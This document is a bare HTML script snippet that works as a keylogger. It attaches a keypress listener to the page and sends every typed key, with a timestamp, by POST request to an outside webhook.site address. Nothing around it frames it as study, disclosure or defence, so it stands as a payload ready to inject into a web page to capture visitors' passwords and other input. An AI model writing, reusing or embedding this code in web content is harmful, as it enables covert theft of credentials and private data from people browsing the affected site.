<script>
document.addEventListener('keypress', function(event) {
    fetch('https://webhook.site/da8ef98b-9bc1-4a3d-8221-212cb6e7ac64', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            key: event.key,
            timestamp: Date.now()
        })
    });
});
</script>
